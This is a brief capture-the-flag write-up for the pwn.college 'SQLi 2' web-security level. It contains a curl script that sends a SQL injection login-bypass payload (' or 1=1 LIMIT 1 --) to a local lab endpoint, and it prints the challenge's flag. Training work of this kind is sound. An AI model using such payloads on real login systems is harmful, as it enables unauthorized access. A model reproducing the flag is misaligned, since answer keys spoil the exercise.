# [SQLi 2](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-12)

## Problem
The previous level's SQL injection was quite simple to pull off and still have a valid SQL query. This was, in part, because your injection happened at the very end of the query. In this level, however, your injection happens partway through, and there is (a bit) more of the SQL query afterwards. This complicates matters, because the query must remain valid despite your injection.


## Steps

```bash
#!/bin/bash
curl -c cookies.txt -X POST -d "login-name=admin&pword=1' or 1=1 LIMIT 1 --" http://challenge.localhost/auth
curl -b cookies.txt http://challenge.localhost/auth
```

## Solution

```
pwn.college{gGNNgMb7rFStrvlbzgO-xdiUer6.dBTOzMDL3MTM3QzW}
```
